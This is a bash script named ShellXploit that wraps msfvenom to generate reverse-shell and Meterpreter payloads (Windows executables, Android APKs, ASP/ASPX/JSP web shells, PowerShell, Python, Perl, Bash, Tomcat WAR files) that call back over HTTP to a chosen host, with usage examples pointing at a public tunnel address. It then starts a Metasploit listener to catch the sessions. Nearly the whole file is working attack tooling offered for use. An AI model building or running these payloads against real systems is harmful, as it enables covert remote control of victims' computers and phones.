#!/bin/bash

# Banner
source builder/src/banner.sh

# Global Variables:
trap ctrl_c INT
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m'

# Functions:

function ctrl_c(){
	echo "Exiting..."
}

function help(){
	echo -e "${GREEN}[*] ShellXploit${NC} ${RED}(v1.0.0)${NC}"
	echo
	echo "Usage: $0 <PLATFORM> <IP>"
	echo
	echo "Example 1 => $0 windows f8a547a4f1eedc.localhost.run"
	echo "Example 2 => $0 android f8a547a4f1eedc.localhost.run"
	echo "Example 3 => $0 aspx f8a547a4f1eedc.localhost.run"
	echo -e "\n"
	echo -e "
	${GREEN}<PLATFORM> <PROTOCOL> <PAYLOAD>${NC}
	\n perl HTTP cmd/unix/reverse_perl
	\n bash HTTP cmd/unix/reverse_bash
	\n android HTTP android/meterpreter/reverse_http
	\n windows HTTP windows/meterpreter/reverse_http
	\n asp HTTP windows/meterpreter/reverse_http
	\n aspx HTTP windows/meterpreter/reverse_http
	\n java HTTP java/meterpreter/reverse_http
	\n powershell HTTP windows/meterpreter/reverse_http
	\n python HTTP python/meterpreter/reverse_http
	\n tomcat HTTP java/meterpreter/reverse_http" | column -t
	echo -e "\n"
	echo -e "${YELLOW}[!] WARNING! Recommendable run ShellXploit with root.${NC}"
}

function configuration(){
	echo -e "${YELLOW}[!] Exploit configuration${NC}"
	echo ""
	echo -e "${GREEN}[+] EXPLOIT${NC}: $1/meterpreter/reverse_http"
	echo -e "${GREEN}[+] PLATFORM${NC}: $1"
	echo -e "${GREEN}[+] PROTOCOL${NC}: HTTP"
	echo -e "${GREEN}[+] PORT${NC}: 80"
	echo -e "${GREEN}[+] IP${NC}: $2"
	echo ""
	echo -e "${YELLOW}[!] Working in the exploit. Be patient!${NC}"
}

output(){
	output="$?"
	if [ $output -eq 0 ]; then
		echo ""
		echo -e "${GREEN}[+] Exploit successfully created${NC}"
	else
		echo -e "${RED}[!] Something went wrong...${NC}"
		exit 1
	fi
}

function meterpreter(){
	echo ""
	echo -e "${YELLOW}[!] WARNING! Are you sure that you want to set the listener?${NC}"
	read -p "[?] Set listener (y/n) >> " listener
	echo ""

	if [ $listener = "y" ]; then
			echo -e "${GREEN}[+] Starting a Metasploit Session${NC}"
			msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $1/meterpreter/reverse_http; set LPORT 80; set LHOST $2; set ReverseListenerBindAddress localhost; exploit;"
	else
		echo -e "${RED}[!] Listener was not set${NC}"
		exit 0
	fi
}

function unix(){
	echo ""
	echo -e "${YELLOW}[!] WARNING! Are you sure that you want to set the listener?${NC}"
	read -p "[?] Set listener (y/n) >> " listener
	echo ""

	if [ $listener = "y" ]; then
			echo -e "${GREEN}[+] Starting a Metasploit Session${NC}"
			msfconsole -q -x "use exploit/multi/handler; set PAYLOAD cmd/unix/reverse_$1; set LPORT 80; set LHOST $2; set ReverseListenerBindAddress localhost; exploit;"
	else
		echo -e "${RED}[!] Listener was not set${NC}"
		exit 0
	fi
}

# Main Program

if [ $# -lt 2 ] || [ $1 = "-h" ]; then
	help
else
	echo -e "${YELLOW}[+] Configuration Selected:${NC}"
	echo ""
	echo -e "${GREEN}[+] IP Selected:${NC}" $2
	echo -e ${GREEN}"[+] Port Selected: ${NC}80"
	echo -e "${GREEN}[+] Protocol Selected: ${NC}HTTP"
	echo -e "${GREEN}[+] Platform Target:${NC}" $1
	echo ""
	
	# PERL
	if [ $1 = "perl" ]; then
		configuration $1 $2
		msfvenom -p cmd/unix/reverse_$1 -f pl --platform unix -a cmd -e generic/none LHOST=$2 LPORT=80 -o exploits/$1-shell-reverse-http-80.pl > /dev/null 2>&1
		output
		unix $1 $2

	# BASH
	elif [ $1 = "bash" ]; then
		configuration $1 $2
		msfvenom -p cmd/unix/reverse_$1 -f raw --platform unix -a cmd -e generic/none LHOST=$2 LPORT=80 -o exploits/$1-shell-reverse-http-80.sh > /dev/null 2>&1
		output
		unix $1 $2

	# ANDROID
	elif [ $1 = "android" ]; then
		configuration $1 $2
		msfvenom -p $1/meterpreter/reverse_http -o exploits/$1-meterpreter-reverse-http-80.apk > /dev/null 2>&1
		output
		meterpreter $1 $2

	# WINDOWS
	elif [ $1 = "windows" ]; then
		configuration $1 $2
		msfvenom -p $1/meterpreter/reverse_http -f exe --platform $1 -a x86 -e generic/none LHOST=$2 LPORT=80 -o exploits/$1-meterpreter-reverse-http-80.exe > /dev/null 2>&1
		output
		meterpreter $1 $2

	#ASP
	elif [ $1 = "asp" ]; then
		configuration $1 $2
		msfvenom -p $1/meterpreter/reverse_http -f asp --platform windows -a x86 -e generic/none LHOST=$2 LPORT=80 -o exploits/$1-meterpreter-reverse-http-80.asp > /dev/null 2>&1
		output
		meterpreter $1 $2

	#ASPX
	elif [ $1 = "aspx" ]; then
		configuration $1 $2
		msfvenom -p $1/meterpreter/reverse_http -f aspx --platform windows -a x86 -e generic/none LHOST=$2 LPORT=80 -o exploits/$1-meterpreter-reverse-http-80.aspx > /dev/null 2>&1
		output
		meterpreter $1 $2

	#JAVA
	elif [ $1 = "java" ]; then
		configuration $1 $2
		msfvenom -p $1/meterpreter/reverse_http -f raw --platform java -a java -e generic/none LHOST=$2 LPORT=80 -o exploits/$1-meterpreter-reverse-http-80.jsp > /dev/null 2>&1
		output
		meterpreter $1 $2

	#POWERSHELL
	elif [ $1 = "powershell" ]; then
		configuration $1 $2
		msfvenom -p $1/meterpreter/reverse_http -f ps1 --platform windows -a x86 -e generic/none LHOST=$2 LPORT=80 -o exploits/$1-meterpreter-reverse-http-80.ps1 > /dev/null 2>&1
		output
		meterpreter $1 $2

	#PYTHON
	elif [ $1 = "python" ]; then
		configuration $1 $2
		sudo msfvenom -p $1/meterpreter/reverse_http -f raw --platform python -a python -e generic/none LHOST=$2 LPORT=80 -o exploits/$1-meterpreter-reverse-http-80.py > /dev/null 2>&1
		output
		meterpreter $1 $2

	#TOMCAT
	elif [ $1 = "tomcat" ]; then
		configuration $1 $2
		sudo msfvenom -p $1/meterpreter/reverse_http -f raw --platform java -a java -e generic/none LHOST=$2 LPORT=80 -o exploits/$1-meterpreter-reverse-http-80.war > /dev/null 2>&1
		output
		meterpreter $1 $2
	fi
fi
